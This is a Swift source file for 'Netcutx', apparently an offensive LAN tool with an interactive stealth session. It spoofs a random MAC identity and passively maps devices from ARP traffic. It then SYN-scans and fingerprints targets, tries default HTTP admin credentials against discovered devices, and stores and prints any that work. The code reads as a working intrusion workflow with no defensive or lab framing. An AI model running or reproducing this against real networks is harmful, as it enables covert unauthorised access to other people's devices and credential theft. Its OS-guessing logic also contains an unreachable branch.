import Foundation

private var sessionFakeMAC: MACAddr = randomMAC()
private var sessionDevices: [DeviceInfo] = []
private var sessionBpf: NetcutxBPF?
private var sessionIface = ""
private var sessionOurIP = ""
private var sessionGw = ""
private var sessionGwMAC: MACAddr = (0,0,0,0,0,0)

func stealthSession() {
    guard getuid() == 0 else { fail("Stealth mode needs sudo"); return }
    guard dbOpen() else { fail("DB init failed"); return }
    defer { dbClose() }

    guard let iface = getDefaultInterface() else { fail("No active interface"); return }
    guard let ourIP = getInterfaceIP(iface) else { fail("Cannot detect IP"); return }
    guard getInterfaceMAC(iface) != nil else { fail("Cannot detect MAC"); return }
    guard let gw = getGatewayIP() else { fail("Cannot detect gateway"); return }

    sessionIface = iface; sessionOurIP = ourIP; sessionGw = gw
    sessionFakeMAC = randomMAC()

    showStealthBanner()
    ok("Interface \(iface) — IP hidden (identity: \(macToString(sessionFakeMAC)))")
    ok("Gateway \(gw)")
    ok("Session DB: /tmp/netcutx_stealth.db")

    while true {
        printStealthMenu()
        guard let input = readLine()?.trimmingCharacters(in: .whitespaces).lowercased() else { continue }

        switch input {
        case "1": doRecon()
        case "2": doProbe()
        case "3": doAccess()
        case "4": doQuery()
        case "5": print(""); ok("Session done"); return
        default: warn("Pilih 1-5")
        }
    }
}

private func showStealthBanner() {
    print("")
    print("  ╔══════════════════════════════════╗")
    print("  ║   Netcutx — Stealth Session      ║")
    print("  ╚══════════════════════════════════╝")
    print("")
    print(c(.dim, "  Identity: \(macToString(sessionFakeMAC)) (random per session)"))
    print(c(.dim, "  Mode: Passive + Intermittent ARP"))
    print(c(.dim, "  No network disruption"))
    print("")
}

private func printStealthMenu() {
    print("")
    print("  [1] Reconnaissance — passive listening")
    print("  [2] Deep Probe — port scan + OS fingerprint")
    print("  [3] Access Services — try open ports")
    print("  [4] Query Database — view collected data")
    print("  [5] Exit + Cleanup")
    print("")
    print(c(.dim, "  Pilih [1-5]:"), terminator: " ")
}

// ── Phase 1: Passive Recon ──────────────────────────────────────────
private func doRecon() {
    status("Passive recon (30s)...")
    let knownDevices = quickScanARPTable(gatewayIP: sessionGw, ourIP: sessionOurIP)
    print("")

    // Collect from ARP cache
    for d in knownDevices {
        if !sessionDevices.contains(where: { $0.ip == d.ip }) {
            sessionDevices.append(d)
            dbUpsertDevice(ip: d.ip, mac: d.mac, hostname: d.hostname)
        }
    }

    // Passive BPF listen for broadcast ARP
    guard let bpf = try? NetcutxBPF(interface: sessionIface) else {
        fail("BPF open failed"); return
    }
    defer { bpf.close() }

    let deadline = Date().addingTimeInterval(25)
    var seenBroadcast = Set<String>()
    while Date() < deadline {
        guard let pkt = try? bpf.receive(timeout: 0.5) else { continue }
        let ethType = (UInt16(pkt.data[12]) << 8) | UInt16(pkt.data[13])
        guard ethType == 0x0806 else { continue } // ARP only
        guard let frame = ARPFrame(from: pkt.data) else { continue }
        if let sip = frame.senderIP, let smac = frame.senderMAC,
           !seenBroadcast.contains(sip), sip != sessionOurIP {
            seenBroadcast.insert(sip)
            let macStr = macToString(smac)
            if !sessionDevices.contains(where: { $0.ip == sip }) {
                let d = DeviceInfo(ip: sip, mac: macStr, hostname: resolveHostname(sip), isGateway: sip == sessionGw, isSelf: false)
                sessionDevices.append(d)
                dbUpsertDevice(ip: sip, mac: macStr, hostname: d.hostname)
                dbInsertEvent(sip, "discovered", "passive ARP")
                ok("Device: \(sip) — \(macStr)")
            }
        }
    }

    // Filter for clean display
    let displayDevices = sessionDevices.filter {
        !$0.ip.hasSuffix(".255") && !$0.ip.hasSuffix(".0") && !$0.isSelf
    }
    if displayDevices.isEmpty {
        warn("No devices found")
    } else {
        print(""); ok("\(displayDevices.count) devices found"); print("")
        for d in displayDevices {
            let tag = d.isGateway ? c(.yellow, " [GATEWAY]") : ""
            print("  \(c(.cyan, d.ip)) \(d.mac) \(d.hostname)\(tag)")
        }
    }
}

// ── Phase 2: Deep Probe ─────────────────────────────────────────────
private func doProbe() {
    let targets = sessionDevices.filter { !$0.isSelf && !$0.ip.hasSuffix(".255") && !$0.ip.hasSuffix(".0") }
    guard !targets.isEmpty else { warn("No targets. Run recon first."); return }

    // Select target
    print(""); print(c(.bold, "  Pilih target:")); print("")
    for (i, d) in targets.enumerated() {
        print("  [\(i+1)] \(c(.cyan, d.ip)) \(d.mac) \(d.hostname)")
    }
    print("")
    print(c(.dim, "  Pilih [1-\(targets.count)] / \"all\":"), terminator: " ")
    guard let input = readLine()?.trimmingCharacters(in: .whitespaces).lowercased() else { return }

    let selected: [DeviceInfo]
    if input == "all" { selected = Array(targets) }
    else if let n = Int(input), n >= 1, n <= targets.count { selected = [targets[n-1]] }
    else { warn("Invalid"); return }

    guard let ourMAC = getInterfaceMAC(sessionIface) else { return }

    let bpf: NetcutxBPF
    do { bpf = try NetcutxBPF(interface: sessionIface) }
    catch { fail("BPF: \(error.localizedDescription)"); return }
    defer { bpf.close() }

    // Resolve gateway MAC if needed
    if isAllZeroMAC(sessionGwMAC) || sessionGwMAC.0 == 0 {
        if let gwMAC = try? resolveMAC(bpf: bpf, ourMAC: ourMAC, ourIP: sessionOurIP, targetIP: sessionGw) {
            sessionGwMAC = gwMAC
        }
    }

    for target in selected {
        let targetMAC: MACAddr
        if let parsed = stringToMAC(target.mac), !isAllZeroMAC(parsed) {
            targetMAC = parsed
        } else {
            guard let resolved = try? resolveMAC(bpf: bpf, ourMAC: ourMAC, ourIP: sessionOurIP, targetIP: target.ip) else {
                warn("Skip \(target.ip) — cannot resolve MAC"); continue
            }
            targetMAC = resolved
        }

        status("Probing \(target.ip)...")
        let result = synScan(bpf: bpf, ourMAC: ourMAC, theirMAC: targetMAC,
                              ourIP: sessionOurIP, theirIP: target.ip)

        if result.open.isEmpty {
            status("\(target.ip): no open ports")
            dbUpsertDevice(ip: target.ip, mac: target.mac, hostname: target.hostname, ports: [])
            continue
        }

        ok("\(target.ip): \(result.open.count) ports open — \(result.open.map(String.init).joined(separator: ","))")

        // Detect service banners
        var services: [String] = []
        for port in result.open.prefix(5) {
            let banner = probeService(target.ip, port)
            services.append("\(port): \(banner)")
            dbInsertEvent(target.ip, "service", "\(port): \(banner)")
        }

        // Simple OS guess from TTL + ports
        let osGuess = guessOS(ttl: result.ttl, ports: result.open, mac: target.mac)

        dbUpsertDevice(ip: target.ip, mac: target.mac, hostname: target.hostname,
                        os: osGuess.name, osConf: osGuess.conf, ports: result.open,
                        services: services.joined(separator: "; "))
        dbInsertEvent(target.ip, "fingerprint", "OS: \(osGuess.name) (\(Int(osGuess.conf*100))%), TTL: \(result.ttl)")

        print("  OS: \(c(.cyan, osGuess.name)) (\(Int(osGuess.conf*100))% confidence)")
        print("  TTL: \(result.ttl)")
        print("  Services: \(services.joined(separator: ", "))")
        print("")
    }
}

// ── Phase 3: Access Services ────────────────────────────────────────
private func doAccess() {
    let devices = dbQuery("SELECT * FROM devices WHERE open_ports != '' AND open_ports != '[]'")
    guard !devices.isEmpty else { warn("No devices with open ports. Run probe first."); return }

    for row in devices {
        guard let ip = row["ip"], let portsStr = row["open_ports"],
              let data = portsStr.data(using: .utf8),
              let ports = try? JSONSerialization.jsonObject(with: data) as? [Int]
        else { continue }

        print("")
        ok("Checking \(ip)...")

        let hasHTTP = ports.contains(80) || ports.contains(8080) || ports.contains(443) || ports.contains(8443)
        let hasSMB = ports.contains(445)
        let hasSSH = ports.contains(22)
        let hasTelnet = ports.contains(23)

        if hasHTTP {
            status("HTTP service...")
            for p in [80, 443, 8080, 8443] {
                guard ports.contains(p) else { continue }
                if let cred = tryHTTPDefaultCreds(ip, port: p) {
                    ok("  \(ip):\(p) — \(cred.user):\(cred.pass)")
                    dbInsertCred(ip, "HTTP:\(p)", cred.user, cred.pass, 1)
                    dbUpsertDevice(ip: ip, mac: "", ports: ports, services: "HTTP admin: \(cred.user):\(cred.pass) (port \(p))")
                    dbInsertEvent(ip, "access", "HTTP \(cred.user):\(cred.pass) port \(p)")
                } else {
                    status("  \(ip):\(p) — no default creds")
                }
            }
        }
        if hasSMB {
            status("SMB — check share (need smbutil)")
            // ponytail: SMB check via smbutil is complex, skip raw implementation
            dbInsertEvent(ip, "smb_present", "port 445 open")
        }
        if hasSSH { dbInsertEvent(ip, "ssh_present", "port 22 open — manual check") }
        if hasTelnet { dbInsertEvent(ip, "telnet_present", "port 23 open") }
    }
    print(""); ok("Access check done")
}

// ── Phase 4: Query Database ─────────────────────────────────────────
private func doQuery() {
    let devices = dbQuery("SELECT ip,mac,hostname,os,os_conf,open_ports,services FROM devices ORDER BY ip")
    let creds = dbQuery("SELECT device_ip,service,username,password,success FROM credentials WHERE success=1")
    let events = dbQuery("SELECT ts,device_ip,event_type,detail FROM events ORDER BY id DESC LIMIT 20")

    print(""); print(c(.bold, "  ── Known Devices ──")); print("")
    for d in devices {
        let ip = d["ip"] ?? "?"
        let mac = d["mac"] ?? "?"
        let os = d["os"] ?? "?"
        let ports = d["open_ports"] ?? ""
        let _ = d["os_conf"] ?? ""
        let note = ip == sessionGw ? c(.yellow, " (gateway)") : ""
        print("  \(c(.cyan, pad(ip, 16))) \(pad(mac, 18)) OS: \(pad(os, 12)) \(ports)\(note)")
    }

    if !creds.isEmpty {
        print(""); print(c(.bold, "  ── Found Credentials ──")); print("")
        for c in creds {
            print("  \(c["device_ip"] ?? "?") \(c["service"] ?? "?") \(c["username"] ?? ""):\(c["password"] ?? "")")
        }
    }

    print(""); print(c(.bold, "  ── Recent Events (20) ──")); print("")
    for e in events.prefix(10) {
        print("  \(e["ts"]?.suffix(15) ?? "?") \(e["device_ip"] ?? "?") \(e["event_type"] ?? "?")")
    }
}

// ── Simple OS Guesser ──────────────────────────────────────────────
private func guessOS(ttl: UInt8, ports: [Int], mac: String) -> (name: String, conf: Float) {
    let portSet = Set(ports)
    if portSet.contains(5555) { return ("Android", 0.8) }
    if portSet.contains(62078) { return ("iPhone", 0.8) }
    if ttl >= 128 { return ("Windows", 0.6) }
    if ttl <= 64 {
        if portSet.contains(22) { return ("Linux", 0.6) }
        if portSet.contains(7000) || portSet.contains(5000) { return ("macOS", 0.6) }
        if portSet.contains(80) || portSet.contains(443) { return ("Linux", 0.4) }
        return ("Unknown (mobile?)", 0.3)
    }
    if ttl == 255 { return ("Router", 0.5) }
    return ("Unknown", 0.1)
}
